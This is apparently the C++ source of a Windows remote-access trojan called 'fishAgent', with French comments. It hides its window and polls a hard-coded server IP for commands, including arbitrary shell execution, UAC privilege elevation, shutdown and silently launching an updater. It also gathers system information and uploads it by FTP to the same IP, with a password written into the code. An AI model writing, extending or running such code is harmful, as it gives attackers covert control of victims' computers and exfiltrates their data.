#include <windows.h>
#include <wininet.h>
#include <cstdlib>
#include <tchar.h>
#include <thread>
#include <chrono>
#include <string>
#include <iostream>
#include <fstream>
#include <shlwapi.h>

#include "../include/core.h"
#include "../include/command.h"
#include "../include/system-info.h"
#include "../include/uuid.h"

using namespace std;

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "shlwapi.lib") // Nécessaire pour PathFileExistsA

// Effectue une requête HTTP GET pour récupérer une commande depuis un serveur distant.
string GetCommand() {
    string command;

    HINTERNET hInternet = InternetOpenA("fishAgent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {

        HINTERNET hConnect = InternetOpenUrlA(hInternet, "http://45.90.160.149:5000/command", NULL, 0, INTERNET_FLAG_RELOAD, 0);
        if (hConnect) {
            char buffer[256];
            DWORD bytesRead = 0;

            if (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                command = buffer;
            }
            InternetCloseHandle(hConnect);
        }
        InternetCloseHandle(hInternet);
    }
    // MessageBox(NULL, command.c_str(), TEXT("Alerte"), MB_OK);
    return command;
}

// Fonction pour lancer les mises à jour
string userFolder = GetUserFolderPath();
string updaterFolder = userFolder + "\\fish";
string updaterPath = updaterFolder + "\\updater.exe";
void StartUpdate(const string& UpdaterPath) {
    ShellExecute(NULL, "open", UpdaterPath.c_str(), NULL, NULL, SW_HIDE);
}

// Thread qui interroge périodiquement le serveur pour vérifier la commande.
void ListenForCommand() {
    while (true) {
        string cmd = GetCommand();

        if (cmd == "show") {
            ShowMessage();
        }
        else if (cmd == "update") {
            StartUpdate(updaterPath);
            this_thread::sleep_for(chrono::seconds(2));
            exit(0);
        }
        else if (cmd == "wind") {
            wind();
        }
        else if (cmd == "shtd") {
            shtd();
        }
        else if (cmd == "UAC") {
            RequestAdminPrivileges();
        }
        else if (cmd.substr(0, 6) == "shell ") {
            string shellCommand = cmd.substr(6); 
            ExecuteShellCommand(shellCommand);
        }

        this_thread::sleep_for(chrono::seconds(5));
    }
}

// Point d'entrée de l'application Windows (aucune console ne sera affichée)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    //string globalUUID = GetUUID();

    thread listener(ListenForCommand);
    listener.detach();

    while (true) {
        this_thread::sleep_for(chrono::seconds(60));

        if (!PathFileExistsA("system_info.dat")) {
            // Si le fichier n'existe pas, on le crée et on l'upload
            createSystemInfoFile();
            uploadFileToFTP("45.90.160.149", "debian", "UiCT?\"Zn3BXM^~ouprhl3N^b2Iy!CF`u%e$P?#sS@@hwerwPn%i=1*1;nfb`RKX7", "system_info.dat", "system_info.dat");
            //MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
        } else {
            // Sinon, on lit l'UUID existant
            //readUUIDFromFile();
            //MessageBox(NULL, TEXT(globalUUID.c_str()), TEXT("Alerte"), MB_OK);
        }
    }

    return 0;
}
